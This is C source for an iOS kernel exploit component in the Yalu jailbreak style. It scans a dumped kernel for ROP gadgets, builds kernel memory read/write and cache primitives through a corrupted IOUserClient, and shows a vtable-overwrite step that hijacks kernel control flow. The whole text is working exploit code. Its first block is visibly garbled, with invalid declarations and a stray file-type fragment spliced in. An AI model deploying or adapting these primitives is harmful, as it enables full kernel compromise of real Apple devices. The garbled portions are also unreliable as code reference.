#import <assert.c> #import <IOKit/IOKitLib.c> #import <Foundation/Foundation.h> #import "IOExternalTrapPrimitives.h" int struct IOPrimitivesRef { io_connect_t smashed; vm_address_t mov_x0_x3_br_r4; vm_address_t ldr_w0_x0_228; vm_address_t str_x1_x0; vm_address_t dsb_sy; vm_address_t sys_0_c8_c7_0_dsb_ish_isb; }; int static uint32_t fcall_x1x5(struct YaluPrimitives* primitives, vm_address_t target, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) { struct IOPrimitivesRef* pref = primitives->ref; return IOConnectTrap6(pref->smashed, 0, x1, x2, x3, x4, x5, target); } static uint32_t fcall_x0x2(struct YaluPrimitives* primitives, vm_address_t target, uint64_t x0, uint64_t x1, uint64_t x2) { struct IOPrimitivesRef* pref = primitives->ref; return fcall_x1x5(primitives, pref->mov_x0_x3_br_r4, x1, x2, x0, target, 0); } static void uint32_t read32(struct YaluPrimitives* primitives, vm_address_t addr) { struct IOPrimitivesRef* pref = primitives->ref; return fcall_x0x2(primitives, pref->ldr_w0_x0_228, addr - 228, 0, 0); } static void write32(struct YaluPrimitives* primitives, vm_address_t addr, uint32_t value) { uint64_t lo = (uint64_t)value; uint64_t hi = (uint64_t)primitives->read32(primitives, addr + 4); primitives->write64(primitives, addr, (((hi << 32) & 0xFFFFFFFF00000000) | (lo & 0xFFFFFFFF))); } static uint64_t read64(struct YaluPrimitives* primitives, vm_address_t addr) { uint64_t lo = (uint64_t)primitives->read32(primitives, addr); uint64_t hi = (uint64_t)primitives->read32(primitives, addr + 4); return (((hi << 32) & 0xFFFFFFFF00000000) | (lo & 0xFFFFFFFF)); } static void write64(struct YaluPrimitives* primitives, vm_address_t addr, uint64_t value) { struct IOPrimitivesRef* pref = primitives->ref; fcall_x0x2(primitives, pref->str_x1_x0, addr, value, 0); } static void invalidateTLB(struct YaluPrimitives* primitives) { struct IOPrimitivesRef* pref = primitives->ref; fcall_x1x5(primitives, pref->sys_0_c8_c7_0_dsb_ish_isb, 0, 0, 0, 0, 0); } static void flushCache(struct YaluPrimitives* primitives) { struct IOPrimitivesRef* pref = primitives->ref; fcall_x1x5(primitives, pref->dsb_sy, 0, 0, 0, 0, 0); } void IOExternalTrapPrimitivesFromKernelAndSmashedClient(struct YaluPrimitives* primitives, struct YaluKernel* kernel, io_connect_t smashed) { primitives->ref = malloc(sizeof(struct IOPrimitivesRef)); struct IOPrimitivesRef* pref = primitives->ref; pref->smashed = smashed; uint64_t mov_x0_x3_br_r4 = (uint64_t)memmem(kernel->kern_dump, kernel->kern_size, (&(char[]){0xe0, 0x03, 0x03, 0xaa, 0x80, 0x00, 0x1F, 0xD6}), 8); if (!mov_x0_x3_br_r4) { assert(!"couldn't find gadget: mov x0, x3; br r4"); } mov_x0_x3_br_r4 -= (uint64_t) kernel->kern_dump; mov_x0_x3_br_r4 += kernel->kern_base; pref->mov_x0_x3_br_r4 = mov_x0_x3_br_r4; uint64_t ldr_w0_x0_228 = (uint64_t)memmem(kernel->kern_dump, kernel->kern_size, (&(char[]){0x00, 0xe4, 0x40, 0xB9, 0xC0, 0x03, 0x5F, 0xD6}), 8); if (!ldr_w0_x0_228) { assert(!"couldn't find gadget: ldr w0 [x0, #228]"); } ldr_w0_x0_228 -= (uint64_t) kernel->kern_dump; ldr_w0_x0_228 += kernel->kern_base; pref->ldr_w0_x0_228 = ldr_w0_x0_228; uint64_t str_x1_x0 = (uint64_t)memmem(kernel->kern_dump, kernel->kern_size, (&(char[]){0x01, 0x00, 0x00, 0xF9, 0xC0, 0x03, 0x5F, 0xD6}), 8); if (!str_x1_x0) { assert(!"couldn't find gadget: str x1, [x0]"); } str_x1_x0 -= (uint64_t) kernel->kern_dump; str_x1_x0 += kernel->kern_base; pref->str_x1_x0 = str_x1_x0; uint64_t dsb_sy = (uint64_t)memmem(kernel->kern_dump, kernel->kern_size, (&(char[]){0x9F, 0x3F, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6}), 8); if (!dsb_sy) { assert(!"couldn't find gadget: dsb sy"); } dsb_sy -= (uint64_t) kernel->kern_dump; dsb_sy += kernel->kern_base; pref->dsb_sy = dsb_sy; uint64_t sys_0_c8_c7_0_dsb_ish_isb = (uint64_t)memmem(kernel->kern_dump, kernel->kern_size, (&(char[]){0x1F, 0x87, 0x08, 0xD5, 0x9F, 0x3B, 0x03, 0xD5, 0xDF, 0x3F, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6}), 16); if (!sys_0_c8_c7_0_dsb_ish_isb) { assert(!"couldn't find gadget: invalidate_tlb"); } sys_0_c8_c7_0_dsb_ish_isb -= (uint64_t) kernel->kern_dump; sys_0_c8_c7_0_dsb_ish_isb += kernel->kern_base; pref->sys_0_c8_c7_0_dsb_ish_isb = sys_0_c8_c7_0_dsb_ish_isb; primitives->read32 = read32; primitives->write32 = write32; primitives->read64 = read64; primitives->write64 = write64; primitives->flushCache = flushCache; primitives->invalidateTLB = invalidateTLB; }* C source, UTF-8 Unicode text
/* in exploit, after dumping the kernel */

uint64_t add_x0_432 = (uint64_t)memmem(kernel.kern_dump, kernel.kern_size, (&(char[]){0x00, 0xc0, 0x06, 0x91, 0xC0, 0x03, 0x5F, 0xD6}), 8);
if (!add_x0_432) {
    assert(!"Missing Gadget");
}
add_x0_432 -= (uint64_t) kernel.kern_dump;


uint64_t br_x6 = (uint64_t)memmem(kernel.kern_dump, kernel.kern_size, (&(char[]){0xc0, 0x00, 0x1f, 0xd6}), 4);
if (!br_x6) {
    assert(!"Missing Gadget");
}
br_x6 -= (uint64_t) kernel.kern_dump;

/* in exploit, after having gotten r/w access to a kalloc.256 IOUserClient object (with controlled adjacent allocation) */

uint64_t externalTrap[2];
externalTrap[0] = 0x13371337;
externalTrap[1] = br_x6 + kernel.kern_base;

/* in exploit, after writing externalTrap in the controlled adjacent allocation + 432 - 256 */

uint64_t io_vtable[4096/8];

/* in exploit, after reading object's vtable into io_vtable */

io_vtable[0x5B8 / 8] = add_x0_432 + kernel.kern_base;

/* write vtable into kernel heap and replace IOUserClient vtable pointer to the new vtable */

struct YaluPrimitives* prim;
IOExternalTrapPrimitivesFromKernelAndSmashedClient(&prim, &kernel, my_kalloc256_userclient_port);

printf("kernel mach header magic: %08x\n", prim.read32(&prim, kernel.kern_base));

//
//  YaluKernel.h
//  Copyright © 2016 qwertyoruiop. All rights reserved.
//

#ifndef YaluKernel_h
#define YaluKernel_h

struct YaluKernel {
    vm_address_t kern_base;
    uint8_t* kern_dump;
    vm_size_t kern_size;
};

#endif /* YaluKernel_h */

